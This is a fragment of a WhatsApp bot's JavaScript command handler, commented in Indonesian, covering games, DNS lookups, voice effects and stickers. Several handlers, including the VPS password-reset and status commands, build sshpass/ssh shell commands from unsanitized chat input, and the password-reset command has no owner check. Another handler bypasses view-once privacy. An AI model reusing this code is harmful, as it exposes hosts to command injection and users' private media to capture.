    { soal: "🏫📚📝", jawaban: "sekolah" },
    { soal: "⚽🥅", jawaban: "sepak bola" }
  ]
  const item = data[Math.floor(Math.random() * data.length)]

  ZakzzDev.tebakemoji = ZakzzDev.tebakemoji || {}
  ZakzzDev.tebakemoji[m.sender] = item.jawaban

  m.reply(`🎭 Tebak Emoji:\n\n${item.soal}\n\nKetik jawabanmu!`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "suit": {
  const pilihanBot = ["batu", "gunting", "kertas"][Math.floor(Math.random() * 3)]
  const pilihanUser = args[0]?.toLowerCase()
  if (!pilihanUser || !["batu", "gunting", "kertas"].includes(pilihanUser)) {
    return m.reply("Gunakan dengan: .suit batu/gunting/kertas")
  }

  let hasil
  if (pilihanUser === pilihanBot) hasil = "Seri!"
  else if (
    (pilihanUser === "batu" && pilihanBot === "gunting") ||
    (pilihanUser === "gunting" && pilihanBot === "kertas") ||
    (pilihanUser === "kertas" && pilihanBot === "batu")
  ) hasil = "Kamu Menang!"
  else hasil = "Kamu Kalah!"

  m.reply(`✂️ SUIT!\nKamu: ${pilihanUser}\nBot: ${pilihanBot}\n🎯 Hasil: ${hasil}`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "dadu": {
  const hasil = Math.floor(Math.random() * 6) + 1
  m.reply(`🎲 Angka Dadu yang keluar: *${hasil}*`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tebaklirik": {
  const lagu = [
    { potongan: "Aku tak bisa jauh, jauh darimu...", jawab: "Tak Bisa ke Lain Hati" },
    { potongan: "Kau begitu sempurna...", jawab: "Sempurna" },
    { potongan: "Andai ku malaikat...", jawab: "Malaikat Juga Tahu" }
  ]
  const dipilih = lagu[Math.floor(Math.random() * lagu.length)]

  ZakzzDev.tebaklirik = ZakzzDev.tebaklirik || {}
  ZakzzDev.tebaklirik[m.sender] = dipilih.jawab.toLowerCase()

  m.reply(`🎧 Tebak Lagu dari potongan lirik:\n\n"${dipilih.potongan}"\n\nKetik judulnya!`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "buatgrup": {
if (!text) return m.reply("📌 Contoh:\n.buatgrup Nama Grup @tag1 @tag2")

const namaGrup = text.split("@")[0].trim()
const mentionedJid = [...text.matchAll(/@(\d{5,16})/g)].map(v => v[1] + "@s.whatsapp.net")

if (!namaGrup) return m.reply("❌ Masukkan nama grup.")
if (mentionedJid.length < 1) return m.reply("❌ Tag minimal 1 anggota yang akan dimasukkan ke grup.")

m.reply("⏳ Membuat grup...")

try {
const response = await ZakzzDev.groupCreate(namaGrup, mentionedJid)

if (response.id) {
m.reply(`✅ Grup berhasil dibuat!\n\n📍 *Nama:* ${response.subject}\n👥 *Anggota:* ${response.participants.length}\n🔗 *ID:* ${response.id}`)
} else {
m.reply("❌ Gagal membuat grup.")
}
} catch (err) {
console.log(err)
m.reply("❌ Terjadi kesalahan saat membuat grup.")
}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cloudflareip": case "cfip": {
  if (!text) return m.reply("⨠ Masukkan domain!\n\nContoh: .cfip example.com")
  if (!text.includes(".")) return m.reply("⨠ Format domain tidak valid!")

  try {
    const api = await fetchJson(`https://cloudflare-dns.com/dns-query?name=${text}&type=A`, {
      headers: { 'accept': 'application/dns-json' }
    })

    if (!api.Answer) return m.reply(`⨠ Domain *${text}* tidak ditemukan dalam DNS Cloudflare!`)

    let ipList = api.Answer.map(x => `↳ ${x.data}`).join('\n')
    let hasil = `⧁ 𝘾𝙁 - 𝙄𝙋 𝘾𝙃𝙀𝘾𝙆 ⧁\n\n` +
                `⨠ Domain: *${text}*\n` +
                `⨠ IP Address:\n${ipList}`

    await m.reply(hasil)
  } catch {
    m.reply("⨠ Gagal mengambil data dari Cloudflare.")
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cloudflareprotect": case "cfprotect": {
  if (!text) return m.reply("⨠ Masukkan domain!\n\nContoh: .cfprotect example.com")
  if (!text.includes(".")) return m.reply("⨠ Format domain tidak valid!")

  try {
    const axios = require('axios')
    const url = text.startsWith("http") ? text : "http://" + text
    const res = await axios.get(url, { timeout: 5000 })
    const server = res.headers['server']?.toLowerCase() || "tidak terdeteksi"

    let isCloudflare = server.includes("cloudflare")
    let hasil = `⧁ 𝘾𝙁 - 𝙋𝙍𝙊𝙏𝙀𝘾𝙏 𝘾𝙃𝙀𝘾𝙆 ⧁\n\n` +
                `⨠ Domain: *${text}*\n` +
                `⨠ Server Header: ${server}\n` +
                `⨠ Proteksi: ${isCloudflare ? '✅ Menggunakan Cloudflare' : '❌ Tidak terdeteksi Cloudflare'}`

    m.reply(hasil)
  } catch {
    m.reply("⨠ Tidak bisa mengakses domain tersebut. Pastikan domain hidup.")
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cekdns": {
  if (!text) return m.reply("⨠ Masukkan domain!\n\nContoh: .cfdns example.com")

  const types = ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS']
  let allResults = []

  for (const type of types) {
    try {
      const res = await fetchJson(`https://cloudflare-dns.com/dns-query?name=${text}&type=${type}`, {
        headers: { 'accept': 'application/dns-json' }
      })

      if (res.Answer) {
        const records = res.Answer.map(r => `• ${r.data}`).join('\n')
        allResults.push(`📌 *${type} Record:*\n${records}`)
      }
    } catch {
      allResults.push(`📌 *${type} Record:* Gagal mengambil`)
    }
  }

  let hasil = `⧁ 𝘾𝙁 - 𝘿𝙉𝙎 𝙍𝙀𝘾𝙊𝙍𝘿𝙎 ⧁\n\n` +
              `⨠ Domain: *${text}*\n\n` +
              allResults.join("\n\n")

  m.reply(hasil)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cftrace": {
  if (!text) return m.reply("⨠ Masukkan domain!\n\nContoh: .cftrace example.com")

  try {
    const url = text.startsWith("http") ? text : `https://${text}`
    const res = await fetch(`${url}/cdn-cgi/trace`)
    const txt = await res.text()

    m.reply(`⧁ 𝘾𝙁 - 𝙏𝙍𝘼𝘾𝙀 𝙄𝙉𝙁𝙊 ⧁\n\n${txt}`)
  } catch {
    m.reply("⨠ Gagal mengambil trace dari Cloudflare.")
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cfwhois": {
  if (!text) return m.reply("⨠ Masukkan domain!\n\nContoh: .cfwhois example.com")

  try {
    const res = await fetchJson(`https://rdap.org/domain/${text}`)
    if (res.error) return m.reply("⨠ Gagal mengambil data WHOIS.")
    
    let hasil = `⧁ 𝘾𝙁 - 𝙒𝙃𝙊𝙄𝙎 𝘾𝙃𝙀𝘾𝙆 ⧁\n\n` +
                `⨠ Domain: *${text}*\n` +
                `⨠ Registrar: ${res.registrar?.name || "-"}\n` +
                `⨠ Status: ${res.status?.join(", ") || "-"}\n` +
                `⨠ Dibuat: ${res.events?.find(e => e.eventAction === 'registration')?.eventDate || "-"}\n` +
                `⨠ Berakhir: ${res.events?.find(e => e.eventAction === 'expiration')?.eventDate || "-"}`

    m.reply(hasil)
  } catch {
    m.reply("⨠ Gagal mengambil data WHOIS.")
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cfmode": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text.includes("|")) return m.reply(`📌 Contoh penggunaan:\n.cfmode https://domain.com|api_token|under_attack`);

  const [url, apiToken, mode] = text.split("|").map(e => e.trim());
  if (!url || !apiToken || !mode) return m.reply("❗ Format salah. Contoh:\n.cfmode https://site.com|api_token|under_attack");

  let domain;
  try {
    domain = new URL(url).hostname;
  } catch {
    return m.reply("❌ URL tidak valid!");
  }

  const validModes = ["off", "essentially_off", "low", "medium", "high", "under_attack"];
  if (!validModes.includes(mode)) {
    return m.reply(`❗ Mode tidak valid.\nPilihan yang tersedia:\n${validModes.join(", ")}`);
  }

  const res = await setSecurityLevel(domain, mode, apiToken);

  if (res.success) {
    m.reply(`✅ Mode proteksi berhasil diubah!\n🌐 Domain: ${domain}\n🛡️ Mode: ${mode}`);
  } else {
    m.reply(`❌ Gagal mengatur proteksi:\n📄 ${res.message}`);
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'ubahsuara': {
  const qmsg = m.quoted;
  if (!qmsg || !qmsg.message || !qmsg.message.audioMessage)
    return m.reply("❗ *Reply voice note (VN) / audio dulu.*");

  const mime = 'audio/ogg; codecs=opus';
  const stream = await downloadContentFromMessage(qmsg.message.audioMessage, 'audio');

  let buffer = Buffer.from([]);
  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

  global.suaraEffectQueue = { buffer, mimetype: mime };

  const headerText = "🎚️ *Pilih efek suara yang ingin diterapkan:*";

  ZakzzDev.sendMessage(m.chat, {
    image: { url: 'https://img1.pixhost.to/images/5842/600673742_zakzzdev.jpg' },
    caption: headerText,
    footer: "「 AlwaysZakzz 」",
    buttons: [
      {
        buttonId: 'effect_selector',
        buttonText: { displayText: '🎧 Pilih Efek Suara' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '🎧 ᴘɪʟɪʜ ᴇꜰᴇᴋ ꜱᴜᴀʀᴀ',
            sections: [
              {
                title: "🔊 ᴇꜰᴇᴋ ʀᴇᴀʟɪꜱᴛɪꜱ",
                rows: [
                  { title: "ʀᴏʙᴏᴛ", id: ".efeksuara robot" },
                  { title: "ᴄʜɪᴘᴍᴜɴᴋ", id: ".efeksuara chipmunk" },
                  { title: "ᴅᴇᴇᴘ", id: ".efeksuara deep" },
                  { title: "ᴇᴄʜᴏ", id: ".efeksuara echo" },
                  { title: "ꜱʟᴏᴡ", id: ".efeksuara slow" },
                  { title: "ʀᴇᴠᴇʀꜱᴇ", id: ".efeksuara reverse" },
                  { title: "ꜰᴀꜱᴛ", id: ".efeksuara fast" },
                  { title: "ᴍᴏɴꜱᴛᴇʀ", id: ".efeksuara monster" },
                  { title: "ʙᴀʙʏ", id: ".efeksuara baby" },
                  { title: "ᴄᴇᴡᴇᴋ ʟᴇᴍʙᴜᴛ", id: ".efeksuara cewek" },
                  { title: "ᴄᴏᴡᴏ ʙᴇʀᴀᴛ", id: ".efeksuara cowo" },
                  { title: "ᴛᴇʟᴇᴘʜᴏɴᴇ", id: ".efeksuara telephone" },
                  { title: "ʀᴀᴅɪᴏ", id: ".efeksuara radio" },
                  { title: "ᴍᴇɢᴀᴘʜᴏɴᴇ", id: ".efeksuara megaphone" },
                  { title: "ᴘꜱʏᴄᴏ", id: ".efeksuara psyco" }
                ]
              },
              {
                title: "🎭 ᴇꜰᴇᴋ ʟᴜᴄᴜ & ᴜɴɪᴋ",
                rows: [
                  { title: "ᴢᴏᴍʙɪᴇ", id: ".efeksuara zombie" },
                  { title: "ʜᴀɴᴛᴜ", id: ".efeksuara hantu" },
                  { title: "ᴀʟɪᴇɴ", id: ".efeksuara alien" },
                  { title: "ᴀᴜᴛᴏ-ᴛᴜɴᴇ", id: ".efeksuara autotune" },
                  { title: "ʀᴏʙᴏᴛ ᴘᴀʀᴀʜ", id: ".efeksuara robotparah" },
                  { title: "ꜱʟᴏᴡ ᴍᴏᴛɪᴏɴ", id: ".efeksuara slowmotion" },
                  { title: "ɢʀᴇᴍʟɪɴ", id: ".efeksuara gremlin" },
                  { title: "ᴛᴇᴀᴛᴇʀ ʜᴏʀʀᴏʀ", id: ".efeksuara teater" }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 4,
    viewOnce: true
  }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'efeksuara': {
  const efek = text.trim().split(" ")[0]?.toLowerCase();
  if (!efek) return m.reply("❌ *Efek tidak valid.*");

  const { buffer, mimetype } = global.suaraEffectQueue || {};
  if (!buffer || !/audio/gi.test(mimetype)) {
    return m.reply("❗ *VN belum direply atau session hilang.*");
  }

  const inputPath = './temp_input.ogg';
  const fixedPath = './fixed_input_fixed.ogg';
  const outputPath = './temp_output.mp3';
  fs.writeFileSync(inputPath, buffer);

  exec(`ffmpeg -i "${inputPath}" -acodec libopus "${fixedPath}"`, (convErr) => {
    if (convErr) {
      console.error("❌ Error convert awal:", convErr.message);
      return m.reply("❌ *Gagal convert awal suara.*");
    }

    const filterMap = {
      robot:        "asetrate=8000,atempo=1.1,aresample=44100,chorus=0.6:0.9:55:0.4:0.25:2",
      chipmunk:     "asetrate=44100*1.5,atempo=1.25,aresample=44100",
      deep:         "asetrate=44100*0.6,atempo=1.2,aresample=44100",
      echo:         "aecho=0.8:0.9:1000:0.3",
      slow:         "atempo=0.7",
      reverse:      "areverse",
      fast:         "atempo=1.6",
      monster:      "asetrate=44100*0.5,atempo=1.3,aresample=44100",
      baby:         "asetrate=44100*2,atempo=1.2,aresample=44100",
      cave:         "aecho=0.8:0.9:1000|1800:0.3|0.25",
      megaphone:    "highpass=f=1000, lowpass=f=3000",
      radio:        "highpass=f=200, lowpass=f=3000, volume=1.5",
      telephone:    "bandpass=f=1000:w=300",
      psyco:        "asetrate=44100*1.8,atempo=1.2,aresample=44100",
      cewek:        "asetrate=44100*1.4,atempo=1.15,aresample=44100",
      cowo:         "asetrate=44100*0.8,atempo=1.1,aresample=44100",
      zombie:       "asetrate=44100*0.5,atempo=1.1,aresample=44100,lowpass=f=300",
      hantu:        "aecho=0.8:0.9:1000|1500:0.5|0.6,asetrate=44100*0.7,atempo=1.2,aresample=44100",
      alien:        "asetrate=44100*1.3,atempo=1.2,aresample=44100,chorus=0.6:0.9:55:0.4:0.25:2",
      autotune:     "afftdn,nlmeans,asetrate=44100*1.1,atempo=1.05,aresample=44100",
      robotparah:   "asetrate=9000,atempo=1.0,aresample=44100,chorus=0.5:0.8:60:0.4:0.3:2",
      slowmotion:   "atempo=0.5,asetrate=44100*0.8,aresample=44100",
      gremlin:      "asetrate=44100*2.5,atempo=1.5,aresample=44100",
      teater:       "aecho=0.8:0.9:1200|1400:0.5|0.4,volume=1.8"
    };

    const filter = filterMap[efek];
    if (!filter) return m.reply("❌ *Efek tidak tersedia.*");

    exec(`ffmpeg -i "${fixedPath}" -filter:a "${filter}" "${outputPath}"`, async (err, stdout, stderr) => {
      if (err) {
        console.error("❌ FFmpeg filter error:", err.message);
        return m.reply("❌ *Gagal ubah suara (filter).*");
      }

      await ZakzzDev.sendMessage(m.chat, {
        audio: fs.readFileSync(outputPath),
        mimetype: "audio/mp4",
        ptt: true
      }, { quoted: m });

      [inputPath, fixedPath, outputPath].forEach(file => {
        if (fs.existsSync(file)) fs.unlinkSync(file);
      });
    });
  });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "resetpwvps": {
  if (!text.includes("|")) return m.reply("📌 Contoh:\n.resetpwvps 123.123.123.123|root|passwordlama|passwordbaru");

  let [ip, user, pass, newPass] = text.split("|");

  m.reply("🔐 Mengganti password VPS...");

  exec(`sshpass -p '${pass}' ssh -o StrictHostKeyChecking=no ${user}@${ip} 'echo -e "${newPass}\\n${newPass}" | passwd'`, (err, stdout, stderr) => {
    if (err) return m.reply(`❌ Gagal: ${stderr}`);
    m.reply(`✅ Password VPS berhasil diubah!\n\nIP: ${ip}\n🔑 Password baru: ${newPass}`);
  });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cekramvps": {
  if (!text.includes("|")) return m.reply("📌 Contoh:\n.cpusage 123.123.123.123|root|password");

  let [ip, user, pass] = text.split("|");

  m.reply("📊 Mengambil data penggunaan VPS...");

  let cmd = `sshpass -p '${pass}' ssh -o StrictHostKeyChecking=no ${user}@${ip} "top -b -n1 | head -n 5 && free -m && df -h /"`;

  exec(cmd, (err, stdout, stderr) => {
    if (err) return m.reply(`❌ Gagal mengambil data:\n${stderr}`);
    m.reply(`📥 Info VPS (${ip}):\n\n` + stdout);
  });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cekdatavps": {
  if (!text.includes("|")) return m.reply("📌 Contoh:\n.cekdatavps 123.123.123.123|passwordvps");

  let [ip, pass] = text.split("|");
  let user = "root";

  if (!ip || !pass) {
    return m.reply("❌ Format salah!\nGunakan: .cekdatavps ip|password");
  }


  m.reply("📡 Mengecek koneksi VPS...");

  const cmd = `
    sshpass -p '${pass}' ssh -o StrictHostKeyChecking=no ${user}@${ip} "\
      echo '[📟 Uptime]'; uptime; \
      echo '\\n[🖥️ OS]'; uname -a; \
      echo '\\n[🧠 RAM]'; free -h; \
      echo '\\n[💾 DISK]'; df -h --total | grep total"`;

  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      return m.reply(`❌ Gagal terhubung ke VPS:\n${stderr || err.message}`);
    }

    m.reply(`✅ *VPS Terdeteksi:*\n\n🖥️ IP: \`${ip}\`\n👤 User: \`${user}\`\n\n${stdout}`);
  });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'cweb': case 'createweb': {
    if (!m.quoted) return m.reply('Reply file .zip atau .html yang mau di-deploy');

    if (!args[0]) return m.reply('❌ Masukkan nama project!\nContoh: .createweb zakzz');

    const mime = (m.quoted.msg || m.quoted).mimetype || '';
    if (!/zip|html/.test(mime)) return m.reply('Format file harus .zip atau .html');

    const buffer = await downloadMediaMessage(m.quoted, 'buffer', {}, { logger: pino() });

    const fileName = mime.includes('zip') ? 'index.zip' : 'index.html';
    const fileData = buffer.toString('utf-8');  

    const webName = args[0].toLowerCase();

    const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${global.vercelToken}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            name: webName,
            files: [
                { file: fileName, data: fileData }
            ],
            projectSettings: {
                framework: null,
                outputDirectory: ".",
                buildCommand: null,
                installCommand: null,
                devCommand: null,
                rootDirectory: null
            }
        })
    });

    const deployData = await deployRes.json();

    if (!deployRes.ok) {
        console.log('Deploy Error:', deployData);
        return m.reply(`Gagal deploy ke Vercel:\n${JSON.stringify(deployData)}`);
    }

    m.reply(`✅ Website berhasil dibuat!\n🌐 URL: https://${deployData.url}`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'createscript': case 'createsc': {
  (async () => {
    if (!isCreator && !isOwner) return m.reply("*Fitur khusus Creator & Owner!*");

    let path = require("path");
    let AdmZip = require("adm-zip");
    let fs = require("fs");
    let fetch = require("node-fetch");

    function ensureFile(filePath, defaultContent = '') {
      fs.mkdirSync(path.dirname(filePath), { recursive: true });
      if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, defaultContent, 'utf-8');
      }
    }

    function replaceInFiles(dir, replacements) {
      const files = fs.readdirSync(dir, { withFileTypes: true });
      for (const file of files) {
        const fullPath = path.join(dir, file.name);
        if (file.isDirectory()) {
          replaceInFiles(fullPath, replacements);
        } else {
          let content = fs.readFileSync(fullPath);
          // Replace isi file teks
          if (/(\.js|\.json|\.txt|\.md|\.html|\.css)$/i.test(file.name)) {
            let text = content.toString();
            for (const [pattern, replacement] of replacements) {
              text = text.replace(new RegExp(pattern, "g"), replacement);
            }
            fs.writeFileSync(fullPath, text, "utf-8");
          }
          // Rename file kalau ada nama lama
          for (const [pattern, replacement] of replacements) {
            const regex = new RegExp(pattern, "g");
            if (regex.test(file.name)) {
              const newName = file.name.replace(regex, replacement);
              fs.renameSync(fullPath, path.join(dir, newName));
            }
          }
        }
      }
    }

    const args = text ? text.split('|') : [];
    if (args.length < 5) {
      return m.reply(
        `Format salah!\n` +
        `Example:\n` +
        `${prefix+command} BotName|OwnerName|V1.0|password|menu,sticker,downloader\n\n` +
        `Atau pakai allfitur:\n` +
        `${prefix+command} BotName|OwnerName|V1.0|Password|allfitur`
      );
    }

    const mycfitur = require('./library/AlwaysZakzz.json');
    const [botName, ownerName, botVersion, password, featuresStr] = args;
    let features = featuresStr.split(',').map(f => f.trim());
    if (features.includes("allfitur")) features = mycfitur.map(f => f.name);

    m.reply(`🗂 *Process Script Created*\n> [ \`${botName}\` ]`);

    const fixLink = "https://files.catbox.moe/tdquuz.zip";

    try {
      let res = await fetch(fixLink);
      let buffer = await res.arrayBuffer();
      let tempZipPath = './temp/disini.zip';
      fs.mkdirSync('./temp', { recursive: true });
      fs.writeFileSync(tempZipPath, Buffer.from(buffer));

      let zip = new AdmZip(tempZipPath);
      let extractPath = `./temp/extracted_${m.pushName || 'user'}`;
      zip.extractAllTo(extractPath, true);

      // Pastikan file penting ada
      ensureFile(`${extractPath}/library/AlwaysZakzz.json`, JSON.stringify([], null, 2));
      ensureFile(`${extractPath}/case.js`, '');
      ensureFile(`${extractPath}/settings.js`, '');
      ensureFile(`${extractPath}/connection.js`, '');
      ensureFile(`${extractPath}/database/owner.json`, JSON.stringify([]));

      const casePath = `${extractPath}/case.js`;
      let caseContent = fs.readFileSync(casePath, 'utf-8');
      let validFeatures = [];

      for (let feature of features) {
        let data = mycfitur.find(f => f.name === feature);
        if (!data) continue;

        if (!caseContent.includes(data.function)) {
          caseContent = data.function + '\n' + caseContent;
        }
        if (!caseContent.includes(data.casenya)) {
          caseContent = caseContent.replace('switch (command) {', `switch (command) {\n${data.casenya}`);
        }

        if (data.upFile?.length > 0) {
          for (let file of data.upFile) {
            let filePath = Object.keys(file)[0];
            let fileContent = file[filePath];
            let fullPath = path.join(extractPath, filePath);
            ensureFile(fullPath, fileContent);
          }
        }

        validFeatures.push(feature);
        await new Promise(r => setTimeout(r, 300));
      }

      fs.writeFileSync(casePath, caseContent, 'utf-8');

      const updateText = (filePath, updates) => {
        let text = fs.readFileSync(filePath, 'utf-8');
        for (let [pattern, replacement] of updates) {
          text = text.replace(new RegExp(pattern, 'g'), replacement);
        }
        fs.writeFileSync(filePath, text, 'utf-8');
      };

      updateText(`${extractPath}/connection.js`, [[`const pw = ".*?";`, `const pw = "${password}";`]]);
      updateText(`${extractPath}/settings.js`, [
        [`global.owner = .*`, `global.owner = "${m.sender.split('@')[0]}";`],
        [`global.namabot = .*`, `global.namabot = '${botName}';`],
        [`global.ownername = .*`, `global.ownername = '${ownerName}';`],
        [`global.botversion = .*`, `global.botversion = '${botVersion}';`]
      ]);

      fs.writeFileSync(`${extractPath}/database/owner.json`, JSON.stringify([m.sender.split('@')[0]]), 'utf-8');

      const listMenuPath = `${extractPath}/library/AlwaysZakzz.json`;
      let menu = JSON.parse(fs.readFileSync(listMenuPath, 'utf-8'));
      validFeatures.forEach(f => { if (!menu.includes(f)) menu.push(f) });
      fs.writeFileSync(listMenuPath, JSON.stringify(menu, null, 2), 'utf-8');

      // 🔹 REPLACE SEMUA IDENTITAS LAMA
      const oldIdentities = [
        "NamaAuthorLama",
        "BotLama",
        "OwnerNameLama",
        "NomorOwnerLama",
        "WatermarkLama"
      ];
      const newIdentities = [
        "AlwaysZakzz Official",
        "Botz AlwaysZakzz V9",
        "AlwaysZakzz",
        "6282120770313",
        "AlwaysZakzz Official"
      ];
      let replacements = oldIdentities.map((oldVal, i) => [oldVal, newIdentities[i]]);
      replaceInFiles(extractPath, replacements);

      let newZip = new AdmZip();
      newZip.addLocalFolder(extractPath);
      let outputZip = `./temp/sc_${m.pushName || 'user'}.zip`;
      newZip.writeZip(outputZip);

      if (validFeatures.length === 0) return m.reply("❌ Tidak ada fitur valid!");

      await ZakzzDev.sendMessage(m.chat, {
        document: fs.readFileSync(outputZip),
        mimetype: 'application/zip',
        fileName: `sc_${botName}.zip`,
        caption: `✅ Script Created! By AlwaysZakzz\n*Creator:* ${m.pushName || 'user'}\n*Fitur:* [${validFeatures}]\n*Password:* ${password}`
      }, { quoted: m });

      fs.rmSync(extractPath, { recursive: true, force: true });
      fs.unlinkSync(tempZipPath);
      fs.unlinkSync(outputZip);
    } catch (err) {
      console.error(err);
      m.reply(`❌ Error: ${err.message}`);
    }
  })();
}

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
await ZakzzDev.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
await ZakzzDev.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return ZakzzDev.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return ZakzzDev.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return ZakzzDev.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tourl": {
    if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))

    let media = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
    const { ImageUploadService } = require('node-upload-images')
    const service = new ImageUploadService('pixhost.to')

    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'AlwaysZakzz.png')

    let teks = `✅ ᴜᴘʟᴏᴀᴅ ʙᴇʀʜᴀsɪʟ\n\n${directLink}`

    let msgii = await generateWAMessageFromContent(m.chat, {
        viewOnceMessageV2Extension: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `© 2025 ${botname}`
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonParamsJson: `{\"display_text\":\"📋 Salin Link\",\"id\":\"copy_tourl_1\",\"copy_code\":\"${directLink}\"}`
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: `{\"display_text\":\"🌐 Buka Link\",\"url\":\"${directLink}\"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.sender, quoted: m })

    await ZakzzDev.relayMessage(m.chat, msgii.message, { 
        messageId: msgii.key.id 
    })

    await fs.unlinkSync(media)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tourl2": {
if (!/image/.test(mime)) return Reply(example("dengan kirim/reply foto"))
let media = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'AlwaysZakzz.png');
let teks = directLink.toString()
await ZakzzDev.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await ZakzzDev.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await ZakzzDev.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await ZakzzDev.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
